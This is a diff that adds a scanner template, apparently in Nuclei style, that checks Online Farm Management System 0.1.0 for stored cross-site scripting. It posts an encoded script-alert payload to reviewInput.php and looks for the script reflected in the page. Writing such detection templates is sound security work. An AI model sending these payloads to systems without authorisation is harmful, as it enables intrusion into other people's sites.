@@ -1,0 +1,34 @@
+id: onlinefarm-management-xss
+brief:
+    title: Online Farm Management System 0.1.0 - Cross-Site Scripting
+    by: arafatansari
+    level: high
+    about: Online Farm Management System 0.1.0 contains a cross-site scripting vulnerability via the review.php file.
+    label:
+        - onlinefarm
+        - cms
+        - xss
+        - edb
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/reviewInput.php?pid=1'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: comment=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&rating=0
+      signs:
+        - "on": word
+          has:
+            - '<em style="color: black;"><script>alert(document.domain)</script>'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
